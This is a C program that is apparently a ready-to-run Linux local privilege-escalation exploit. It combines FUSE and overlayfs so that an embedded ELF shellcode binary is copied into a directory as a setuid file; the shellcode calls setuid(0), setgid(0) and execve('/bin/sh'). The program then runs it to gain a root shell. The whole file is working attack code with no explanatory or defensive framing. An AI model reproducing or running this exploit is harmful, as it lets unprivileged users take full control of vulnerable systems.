#define FUSE_USE_VERSION 30

#include <fuse.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>

static const char *hello_path = "/hello";
const char hello_str[] = {
    0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00,
    0x00, 0x56, 0x56, 0x56, 0x56, 0x00, 0x00, 0x00,
    0x02, 0x00, 0x3e, 0x00, 0x01, 0x00, 0x00, 0x00,
    0xb0, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00,
    0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x40, 0x00, 0x38, 0x00,
    0x02, 0x00, 0x40, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x01, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x00,
    0xf6, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xf6, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x51, 0xe5, 0x74, 0x64, 0x07, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x10, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0x31, 0xff, 0x31, 0xd2, 0x31, 0xf6, 0x6a, 0x75,
    0x58, 0x0f, 0x05, 0x31, 0xff, 0x31, 0xd2, 0x31,
    0xf6, 0x6a, 0x77, 0x58, 0x0f, 0x05, 0x6a, 0x68,
    0x48, 0xb8, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x2f,
    0x2f, 0x73, 0x50, 0x48, 0x89, 0xe7, 0x68, 0x72,
    0x69, 0x01, 0x01, 0x81, 0x34, 0x24, 0x01, 0x01,
    0x01, 0x01, 0x31, 0xf6, 0x56, 0x6a, 0x08, 0x5e,
    0x48, 0x01, 0xe6, 0x56, 0x48, 0x89, 0xe6, 0x31,
    0xd2, 0x6a, 0x3b, 0x58, 0x0f, 0x05};

static int hellofs_getattr(const char *path, struct stat *stbuf)
{
    int res = 0;

    memset(stbuf, 0, sizeof(struct stat));

    if (strcmp(path, "/") == 0) {
        stbuf->st_mode = S_IFDIR | 0755;
        stbuf->st_nlink = 2;
    } else if (strcmp(path, hello_path) == 0) {
    stbuf->st_mode = S_IFREG | S_ISUID | 0777;
        stbuf->st_nlink = 1;
        stbuf->st_size = sizeof(hello_str); // zero-size file
    } else {
        res = -ENOENT;
    }

    return res;
}

static int hellofs_readdir(const char *path, void *buf, fuse_fill_dir_t filler,
                           off_t offset, struct fuse_file_info *fi)
{
    (void) offset;
    (void) fi;

    if (strcmp(path, "/") != 0) {
        return -ENOENT;
    }

    filler(buf, ".", NULL, 0);
    filler(buf, "..", NULL, 0);
    filler(buf, hello_path + 1, NULL, 0);

    return 0;
}

static int hellofs_open(const char *path, struct fuse_file_info *fi)
{
    if (strcmp(path, hello_path) != 0) {
        return -ENOENT;
    }

    return 0;
}

static int hellofs_read(const char *path, char *buf, size_t size, off_t offset,
                        struct fuse_file_info *fi)
{
    size_t len;
    (void) fi;
    if(strcmp(path, hello_path) != 0) {
        return -ENOENT;
    }
    len = sizeof(hello_str);
    if (offset < len) {
        if (offset + size > len) {
            size = len - offset;
        }
        memcpy(buf, hello_str + offset, size);
    } else {
        size = 0;
    }

    return size;
}

static struct fuse_operations hellofs_oper = {
    .getattr = hellofs_getattr,
    .readdir = hellofs_readdir,
    .open = hellofs_open,
    .read = hellofs_read,
};

int main(int argc, char *argv[])
{
    if(argc < 2)
    {
	    printf("./exp dir(dir that you can write and not mount by nosuid)\n");
	    exit(-1);
    }
    char fuse_dir[0x1000];
    strcpy(fuse_dir, argv[1]);
    strcat(fuse_dir, "/testfuse");

    char command[0x1000] = "mkdir ";
    strcat(command, fuse_dir);
    system(command);
    char * fusedir[] = {"exp", fuse_dir};
    if(!fork())
    {
    fuse_main(2,fusedir , &hellofs_oper, NULL);
    }
    
    char up_dir[0x1000];
    strcpy(up_dir, argv[1]);
    strcat(up_dir, "/updir");
    strcpy(command, "mkdir ");
    strcat(command, up_dir);
    system(command);

    char ol_dir[0x1000];
    strcpy(ol_dir, argv[1]);
    strcat(ol_dir, "/overlaydir");
    strcpy(command, "mkdir ");
    strcat(command, ol_dir);
    system(command);

    char work_dir[0x1000];
    strcpy(work_dir, argv[1]);
    strcat(work_dir, "/workdir");
    strcpy(command, "mkdir ");
    strcat(command, work_dir);
    system(command);
    
    //unshare -Urm /bin/sh -c '{ mount -t overlay overlay -o lowerdir=/tmp/testfuse,upperdir=/tmp/updir,workdir=/tmp/workdir /tmp/overlaydir; touch /tmp/overlaydir/hello'; }'
    strcpy(command, "unshare -Urm /bin/sh -c '{ mount -t overlay overlay -o lowerdir=");
    strcat(command, fuse_dir);
    strcat(command, ",upperdir=");
    strcat(command, up_dir);
    strcat(command, ",workdir=");
    strcat(command, work_dir);
    strcat(command, " ");
    strcat(command, ol_dir);
    strcat(command, "; touch ");
    strcat(command, ol_dir);
    strcat(command, "/hello; }'");
    system(command);
    ///tmp/updir/hello
    strcpy(command, up_dir);
    strcat(command, "/hello");
    system(command);
    return 0;
}
